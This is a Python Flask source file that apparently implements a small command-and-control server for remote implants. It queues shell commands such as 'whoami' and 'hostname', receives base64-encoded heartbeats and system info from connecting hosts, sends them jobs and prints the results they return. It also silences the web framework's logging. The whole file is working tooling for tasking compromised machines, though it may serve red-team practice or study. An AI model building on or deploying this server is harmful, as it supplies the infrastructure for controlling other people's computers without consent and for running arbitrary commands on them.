import base64
import json
import logging
from pprint import pprint
import queue

from flask import Flask, jsonify, request

# Jobs
jobs = queue.Queue()
jobs.put({'job_id': 0, 'cmd': 'hostname'})
jobs.put({'job_id': 1, 'cmd': 'whoami'})

app = Flask(__name__)

# Disable Flask Logging
app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.disabled = True


def decode_message(message):
    return base64.b64decode(message).decode('utf-8')


def encode_message(message):
    return base64.b64encode(message.encode('utf-8')).decode('utf-8')


@app.route('/heartbeat/<message>')
def heartbeat(message):
    host = request.remote_addr
    message = json.loads(decode_message(message))
    hostname = message['systeminfo']['hostname']

    print(f'💓 Received heartbeat from {host} ({hostname})')

    return 'Received', 200


@app.route('/get-job/<message>')
def get_job(message):
    host = request.remote_addr
    message = json.loads(decode_message(message))

    print(f'➕ Received job request from {host} ({message})')

    try:
        # We are ignoring any other requests (e.g., for a specific job)
        if message == 'latest':
            if jobs.empty():
                print(f'❌ No jobs available')
                return 'No jobs available', 404
            else:
                job = jobs.get()
                print(f'➕ Sending job {job["job_id"]} ({job["cmd"][0:15]}) to {host}')
                return encode_message(json.dumps(job))
        else:
            print(f'❌ No fitting job found ({message})')
    except IndexError:
        print(f'❌ Error sending job {host}')


@app.route('/job-result/<message>')
def job_result(message):
    host = request.remote_addr
    message = json.loads(decode_message(message))

    if message['success'] == True:
        print(f'✅ Received confirmation for job {message["job_id"]} ({message["cmd"][0:15]}) from {host}')
        print(f'\n{message["result"]}\n')
    else:
        print(f'❌ Received error for job {message["job_id"]} ({message["cmd"][0:15]}) from {host}: {message["result"]}')

    return 'Received', 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=81)
